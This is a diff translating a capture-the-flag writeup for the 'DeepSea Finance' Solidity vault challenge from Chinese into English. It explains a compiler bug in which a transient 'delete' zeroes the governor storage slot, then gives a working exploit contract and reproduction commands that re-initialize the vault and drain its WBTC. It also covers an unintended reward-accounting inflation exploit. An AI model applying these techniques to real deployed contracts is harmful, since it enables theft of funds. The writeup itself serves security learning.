@@ -1,6 +1,6 @@
 # DeepSea Finance — Writeup
 
-## 1.条件
+## 1. Condition
 
 ```solidity
 function isSolved() external view returns (bool) {
@@ -8,35 +8,33 @@ function isSolved() external view returns (bool) {
 }
 ```
 
-部署时 `Setup` 向 vault proxy 铸造 `10e8` WBTC（10 WBTC），向 player 发放 `10e6` USDC（10 USDC）。目标：让 vault proxy 的 WBTC 余额归零。
+On deployment, `Setup` mints `10e8` WBTC (10 WBTC) to the vault proxy and `10e6` USDC (10 USDC) to the player. Goal: drain the vault's WBTC balance to zero.
 
 ---
 
-## 2. 资产出口排查
+## 2. Asset Exit Vectors
 
-能转出 WBTC 的路径：
+| Path | Restriction |
+|------|-------------|
+| `withdraw()` | Requires deposits |
+| `borrow()` | Requires sufficient collateral |
+| `liquidate()` | Requires unhealthy position |
+| `flashLoan()` | Requires repayment |
+| `settleAsset()` | Requires relay flag (blocked by reserved route check) |
+| `emergencyWithdraw()` | **Requires guardian role** |
+| `recoverERC20()` | Requires guardian role |
 
-| 路径 | 限制 |
-|------|------|
-| `withdraw()` | 需要有存款 |
-| `borrow()` | 需要足够的抵押品 |
-| `liquidate()` | 需要仓位不健康 |
-| `flashLoan()` | 需要归还 |
-| `settleAsset()` | 需要 relay flag（已被 reserved route 检查挡住） |
-| `emergencyWithdraw()` | **需要 guardian 权限** |
-| `recoverERC20()` | 需要 guardian 权限 |
+Conventional paths are blocked by collateral ratios, flashloan repayment checks, or guardian permissions. The player's 10 USDC at 75% LTV can only borrow ~7.5 USDC worth of WBTC — far from draining 10 WBTC.
 
-常规路径被抵押率、flashloan 归还检查或 guardian 权限限制。player 的 10 USDC 按 LTV 75% 最多借出价值 7.5 USDC 的 WBTC，无法借空 10 WBTC。
+`settleAsset()` requires `processTranscript()` to open the transient relay flag, but the relay auth route is already blocked by `commitCrossChainState()`'s reserved route check.
 
-`settleAsset()` 需要 `processTranscript()` 打开 transient relay flag，但 relay auth route 已被 `commitCrossChainState()` 的 reserved route 检查挡住。
-
-**关键点**：只要能成为 guardian，就可以通过 `emergencyWithdraw()` 直接转出 vault 的 WBTC。
+**Key insight**: Becoming a guardian allows direct WBTC withdrawal via `emergencyWithdraw()`.
 
 ---
 
-## 3. 初始化锁
+## 3. Initialization Lock
 
-guardian 在 `initialize()` 中设置：
+Guardians are set during `initialize()`:
 
 ```solidity
 function initialize(
@@ -52,15 +50,13 @@ function initialize(
 }
 ```
 
-部署时 proxy 已执行过初始化，`governor != address(0)`，不能重新初始化。
-
-**利用目标变成：清零 `governor`。**
+The proxy is already initialized after deployment, so `governor != address(0)`. **Goal becomes: zero out `governor`.**
 
 ---
 
-## 4. 编译器配置
+## 4. Compiler Configuration
 
-`foundry.toml`：
+`foundry.toml`:
 
 ```toml
 solc_version = "0.8.29"
@@ -68,20 +64,20 @@ via_ir = true
 evm_version = "cancun"
 ```
 
-源码中使用了 transient storage：
+The code uses transient storage:
 
 ```solidity
 address internal transient _epochAnchor;
 address internal transient _epochOperator;
 ```
 
-transient storage 和普通 storage 是两套存储空间。`delete _epochOperator` 的正确语义应该是清 transient storage，而不是写普通 storage。
+Transient storage and regular storage are separate storage spaces. The correct semantics of `delete _epochOperator` should be clearing transient storage, not writing to regular storage.
 
 ---
 
-## 5. 漏洞触发点
+## 5. Bug Trigger
 
-`claimRewards()` → `_settleRewardEpoch()` → `_finalizeRewardEpoch()`：
+`claimRewards()` → `_settleRewardEpoch()` → `_finalizeRewardEpoch()`:
 
 ```solidity
 function claimRewards(address token) external nonReentrant {
@@ -97,53 +93,53 @@ function _settleRewardEpoch(address token) internal {
 }
 
 function _finalizeRewardEpoch(address operator) internal {
-    _epochOperator = operator;   // TSTORE（正确）
-    delete _epochOperator;       // SSTORE slot 1（BUG！）
+    _epochOperator = operator;   // TSTORE (correct)
+    delete _epochOperator;       // SSTORE slot 1 (BUG!)
 }
 ```
 
-`claimRewards()` 不要求用户真的有 pending rewards，只要调用就能走到 `_finalizeRewardEpoch()`。
+`claimRewards()` doesn't require actual pending rewards — calling it is enough to reach `_finalizeRewardEpoch()`.
 
 ---
 
-## 6. IR 证据
+## 6. IR Evidence
 
 ```bash
 forge inspect src/vault/DeepSeaVault.sol:DeepSeaVault irOptimized
 ```
 
-`_finalizeRewardEpoch()` 相关 IR 片段：
+`_finalizeRewardEpoch()` related IR snippet:
 
 ```text
 update_transient_storage_value_offset_address_to_address(0x01, expr)
 storage_set_to_zero_address(0x01, 0)
 ```
 
-- 第一行：`_epochOperator = operator` 使用了 transient write（正确）
-- 第二行：`delete _epochOperator` 被错编成了普通 storage slot 1 清零
+- Line 1: `_epochOperator = operator` uses transient write (correct)
+- Line 2: `delete _epochOperator` is miscompiled as regular storage slot 1 clear
 
-Storage layout：
+Storage layout:
 
 ```text
 slot 0: ReentrancyGuard._status
-slot 1: DeepSeaVault.governor    ← 被清零！
+slot 1: DeepSeaVault.governor    ← zeroed!
 slot 2: priceOracle
 slot 3: rewardToken
 slot 4: _pendingRewardOperator
 ```
 
-solc 0.8.29 + `via_ir` 模式下，`delete` 对 transient 变量的编译存在 bug，生成了 `SSTORE(slot1, 0)` 而不是 `TSTORE`。slot 1 恰好是 `governor`。
+Under solc 0.8.29 + `via_ir` mode, `delete` on a transient variable has a compilation bug: it generates `SSTORE(slot1, 0)` instead of `TSTORE`. Slot 1 happens to be `governor`.
 
 ---
 
-## 7. Exploit 链（预期解）
+## 7. Exploit Chain (Intended)
 
-1. 调用 `vault.claimRewards(wbtc)` → 触发 compiler bug → 清零 `governor`
-2. 调用 `vault.initialize(...)` → 重新初始化，exploit 合约成为 guardian
-3. 调用 `vault.emergencyWithdraw(wbtc, player, fullBalance)` → 转出全部 WBTC
-4. `isSolved()` 返回 `true`
+1. Call `vault.claimRewards(wbtc)` → triggers compiler bug → zeros `governor`
+2. Call `vault.initialize(...)` → re-initializes, exploit contract becomes guardian
+3. Call `vault.emergencyWithdraw(wbtc, player, fullBalance)` → drains all WBTC
+4. `isSolved()` returns `true`
 
-### Exploit 合约
+### Exploit Contract
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -157,10 +153,10 @@ contract Exploit {
         DeepSeaVault vault = setup.vaultProxy();
         address wbtc = address(setup.wbtc());
 
-        // Step 1: 触发 compiler bug，清零 governor
+        // Step 1: Trigger compiler bug, zero governor
         vault.claimRewards(wbtc);
 
-        // Step 2: 重新初始化，成为 guardian
+        // Step 2: Re-initialize, become guardian
         address[] memory guards = new address[](1);
         guards[0] = address(this);
         vault.initialize(
@@ -169,7 +165,7 @@ contract Exploit {
             guards
         );
 
-        // Step 3: 转出全部 WBTC
+        // Step 3: Drain all WBTC
         vault.emergencyWithdraw(
             wbtc,
             player,
@@ -181,10 +177,10 @@ contract Exploit {
 }
 ```
 
-### 复现
+### Reproduce
 
 ```bash
-# 部署 exploit
+# Deploy exploit
 forge create \
   --rpc-url "$RPC_URL" \
   --private-key "$PLAYER_KEY" \
@@ -192,24 +188,24 @@ forge create \
   exp/Exploit.sol:Exploit \
   --constructor-args "$SETUP" "$PLAYER"
 
-# 验证
+# Verify
 cast call "$SETUP" "isSolved()(bool)" --rpc-url "$RPC_URL"
-# 返回 true
+# Returns true
 ```
 
 ---
 
-## 8. 非预期解：奖励记账经济漏洞
+## 8. Unintended Exploit: Reward Accounting Economic Bug
 
-在对编译器漏洞进行隐藏时，故意写了一些漏洞，比如选手可以获得所有的USDC，因为借贷时60010\*0.75，也是不够换出所有wbtc的。但是忽略了一个问题。
+When hiding the compiler bug, some vulnerabilities were intentionally planted — for example, the player could obtain all USDC, since 60010 × 0.75 is still not enough to borrow all WBTC. However, one issue was overlooked.
 
-奖励被设置的很高：
+The reward rate was set too high:
 
 ```solidity
 vaultProxy.addMarket(address(usdc),  5, 1e14);
 ```
 
-领取奖励不是新mint而是直接转vault的：
+Reward claims don't mint new tokens — they directly transfer from the vault:
 
 ```solidity
 function claimRewards(address token) external nonReentrant {
@@ -218,13 +214,13 @@ function claimRewards(address token) external nonReentrant {
     uint256 amt = pos.pendingRewards;
     if (amt > 0 && IERC20(rewardToken).balanceOf(address(this)) >= amt) {
         pos.pendingRewards = 0;
-        rewardToken.safeTransfer(msg.sender, amt); // 奖励直接从 vault 转 USDC
+        rewardToken.safeTransfer(msg.sender, amt); // rewards transferred directly from vault
     }
     _settleRewardEpoch(token);
 }
 ```
 
-问题是在deposit函数中，记账与余额分离了：
+The problem is that in the `deposit()` function, accounting and balance are decoupled:
 
 ```solidity
 function deposit(address token, uint256 amount) external nonReentrant {
@@ -241,13 +237,13 @@ function deposit(address token, uint256 amount) external nonReentrant {
 }
 ```
 
-`deposit()` 只增加用户的 `deposited` 记账，而其在多次 claim→deposit 循环后可以反复膨胀，让用户的抵押品价值超过预期的最多600010*0.75，而最终borrow检查的也是这个值：
+`deposit()` only increases the user's deposited bookkeeping, but after repeated claim→deposit loops it can be inflated arbitrarily, making the collateral value surpass the intended cap of 600010 * 0.75; and the final borrow validation uses this same value.
 
 ```solidity
-uint256 colValueUSD = _assetValueUSD(collateralToken, pos.deposited); // USDC 抵押品的美元价值
+uint256 colValueUSD = _assetValueUSD(collateralToken, pos.deposited); // USDC collateral USD value
 ```
 
-### Exploit 代码
+### Exploit Code
 
 ```javascript
 const { ethers } = require("ethers");
@@ -458,5 +454,3 @@ main().catch((err) => {
   process.exit(1);
 });
 ```
-
----
